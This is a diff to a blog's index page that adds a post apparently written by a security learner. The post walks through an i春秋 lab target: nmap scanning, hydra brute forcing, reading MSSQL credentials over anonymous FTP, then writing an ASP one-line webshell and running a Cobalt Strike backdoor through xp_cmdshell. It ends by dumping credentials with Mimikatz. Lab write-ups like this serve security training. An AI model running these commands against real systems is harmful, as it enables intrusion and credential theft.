@@ -65,6 +65,87 @@
 
     
     
+    <article id="post-绕过火绒靶机获取管理员账号密码" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"
+    >绕过火绒靶机获取管理员账号密码</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" class="article-date">
+  <time datetime="2020-01-10T09:29:52.000Z" itemprop="datePublished">2020-01-10</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a> / <a class="article-category-link" href="/categories/%E9%9D%B6%E6%9C%BA/i%E6%98%A5%E7%A7%8B/">i春秋</a>
+  </div>
+
+      
+      
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><ol>
+<li>Windows、火绒</li>
+<li>网站 <a href="http://192.168.5.157/login/" target="_blank" rel="noopener">http://192.168.5.157/login/</a> （由于目标主机）</li>
+<li>实验工具：nmap、hydra、Xftp6、DBeaver、cobaltstrike3.14</li>
+</ol>
+<h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h5 id="1-首先使用nmap工具对IP（192-168-5-157）进行扫描。"><a href="#1-首先使用nmap工具对IP（192-168-5-157）进行扫描。" class="headerlink" title="1. 首先使用nmap工具对IP（192.168.5.157）进行扫描。"></a>1. 首先使用nmap工具对IP（192.168.5.157）进行扫描。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-1.png" alt></p>
+<h5 id="2-利用hydra工具对ftp等服务进行爆破，发现ftp可以匿名登录。"><a href="#2-利用hydra工具对ftp等服务进行爆破，发现ftp可以匿名登录。" class="headerlink" title="2. 利用hydra工具对ftp等服务进行爆破，发现ftp可以匿名登录。"></a>2. 利用hydra工具对ftp等服务进行爆破，发现ftp可以匿名登录。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-2.png" alt></p>
+<h5 id="3-使用Xftp6工具以ftp方式连接，发现-global-asa-文件下存在mssql账号密码。"><a href="#3-使用Xftp6工具以ftp方式连接，发现-global-asa-文件下存在mssql账号密码。" class="headerlink" title="3. 使用Xftp6工具以ftp方式连接，发现 global.asa 文件下存在mssql账号密码。"></a>3. 使用Xftp6工具以ftp方式连接，发现 global.asa 文件下存在mssql账号密码。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-3.png" alt><br><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-4.png" alt></p>
+<h5 id="4-下载文件，在本地以文本方式查看文件。"><a href="#4-下载文件，在本地以文本方式查看文件。" class="headerlink" title="4. 下载文件，在本地以文本方式查看文件。"></a>4. 下载文件，在本地以文本方式查看文件。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-5.png" alt></p>
+<h5 id="5-利用DBeaver工具连接目标主机的mssql。"><a href="#5-利用DBeaver工具连接目标主机的mssql。" class="headerlink" title="5. 利用DBeaver工具连接目标主机的mssql。"></a>5. 利用DBeaver工具连接目标主机的mssql。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-6.png" alt></p>
+<h5 id="6-通过-exec-xp-cmdshell-‘dir-C-39-命令获得网站路径，上传shell。"><a href="#6-通过-exec-xp-cmdshell-‘dir-C-39-命令获得网站路径，上传shell。" class="headerlink" title="6. 通过 exec xp_cmdshell ‘dir C:&#39; 命令获得网站路径，上传shell。"></a>6. 通过 exec xp_cmdshell ‘dir C:&#39; 命令获得网站路径，上传shell。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-7.png" alt></p>
+<h5 id="7-通过-exec-xp-cmdshell-‘echo-lt-eval-request-“a”-gt-gt-C-www-909-asp’-命令添加一句话木马的asp文件。"><a href="#7-通过-exec-xp-cmdshell-‘echo-lt-eval-request-“a”-gt-gt-C-www-909-asp’-命令添加一句话木马的asp文件。" class="headerlink" title="7. 通过 exec xp_cmdshell ‘echo ^&lt;%eval^ request(“a”)%^&gt; &gt; C:\www\909.asp’ 命令添加一句话木马的asp文件。"></a>7. 通过 exec xp_cmdshell ‘echo ^&lt;%eval^ request(“a”)%^&gt; &gt; C:\www\909.asp’ 命令添加一句话木马的asp文件。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-8.png" alt></p>
+<h5 id="8-利用cobaltstrike3-14工具生成-909-exe-后门文件，使用中国菜刀将后门文件上传到目标主机上。"><a href="#8-利用cobaltstrike3-14工具生成-909-exe-后门文件，使用中国菜刀将后门文件上传到目标主机上。" class="headerlink" title="8. 利用cobaltstrike3.14工具生成 909.exe 后门文件，使用中国菜刀将后门文件上传到目标主机上。"></a>8. 利用cobaltstrike3.14工具生成 909.exe 后门文件，使用中国菜刀将后门文件上传到目标主机上。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-9.png" alt></p>
+<h5 id="9-在DBeaver工具上执行-EXEC-xp-cmdshell-‘c-www-909-exe’-命令，使后门软件开始执行。在cobaltstrike3-14工具的客户端上出现目标主机IP。"><a href="#9-在DBeaver工具上执行-EXEC-xp-cmdshell-‘c-www-909-exe’-命令，使后门软件开始执行。在cobaltstrike3-14工具的客户端上出现目标主机IP。" class="headerlink" title="9. 在DBeaver工具上执行 EXEC xp_cmdshell ‘c:\www\909.exe’ 命令，使后门软件开始执行。在cobaltstrike3.14工具的客户端上出现目标主机IP。"></a>9. 在DBeaver工具上执行 EXEC xp_cmdshell ‘c:\www\909.exe’ 命令，使后门软件开始执行。在cobaltstrike3.14工具的客户端上出现目标主机IP。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-10.png" alt></p>
+<h5 id="10-在cobaltstrike3-14工具的客户端上将设备的sleep时间改为-1-，再点击-Run-Mimikatz-按钮获取账号密码。"><a href="#10-在cobaltstrike3-14工具的客户端上将设备的sleep时间改为-1-，再点击-Run-Mimikatz-按钮获取账号密码。" class="headerlink" title="10. 在cobaltstrike3.14工具的客户端上将设备的sleep时间改为 1 ，再点击 Run Mimikatz 按钮获取账号密码。"></a>10. 在cobaltstrike3.14工具的客户端上将设备的sleep时间改为 1 ，再点击 Run Mimikatz 按钮获取账号密码。</h5><p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-11.png" alt></p>
+<p><img src="/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/%E7%81%AB%E7%BB%92-12.png" alt></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/%E7%BB%95%E8%BF%87%E7%81%AB%E7%BB%92%E9%9D%B6%E6%9C%BA%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" data-id="ck57yrt39000bc0wr9v533ik3"
+        class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
     <article id="post-墨者学院-Apache-Struts2远程代码执行漏洞攻略" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
@@ -116,7 +197,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-Apache-Struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%94%BB%E7%95%A5/" data-id="ck57gnf5o00061owrhhdldtyw"
+      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-Apache-Struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%94%BB%E7%95%A5/" data-id="ck57yrszg0006c0wrghe90dls"
         class="article-share-link">Share</a>
       
     </footer>
@@ -185,7 +266,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" data-id="ck57gnf6w00091owr7wi78pp3"
+      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" data-id="ck57yrt1e0009c0wrghe07gme"
         class="article-share-link">Share</a>
       
     </footer>
@@ -254,7 +335,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" data-id="ck57gnf6400081owrae1yfsaq"
+      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" data-id="ck57yrt0h0008c0wr6h3t2wmr"
         class="article-share-link">Share</a>
       
     </footer>
@@ -325,7 +406,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" data-id="ck57gnf4l00021owr7qsu595o"
+      <a data-url="http://yoursite.com/2019/XSS%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E8%BF%87%E6%94%BB%E7%95%A5/" data-id="ck57yrsw50002c0wr1lzh86vh"
         class="article-share-link">Share</a>
       
     </footer>
@@ -398,7 +479,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck57gnf4600001owr2gppgayk"
+      <a data-url="http://yoursite.com/2019/Sqli-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/" data-id="ck57yrstk0000c0wrhl6rfpji"
         class="article-share-link">Share</a>
       
     </footer>
@@ -470,7 +551,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%95%99%E7%A8%8B/" data-id="ck57gnf4z00051owr757e56fx"
+      <a data-url="http://yoursite.com/2019/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%95%99%E7%A8%8B/" data-id="ck57yrsy50005c0wrf6mu8b70"
         class="article-share-link">Share</a>
       
     </footer>
@@ -540,7 +621,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/hello-world/" data-id="ck57gnf4s00041owrg8akdz7l"
+      <a data-url="http://yoursite.com/2019/hello-world/" data-id="ck57yrsxl0004c0wr3fz7fi6t"
         class="article-share-link">Share</a>
       
     </footer>
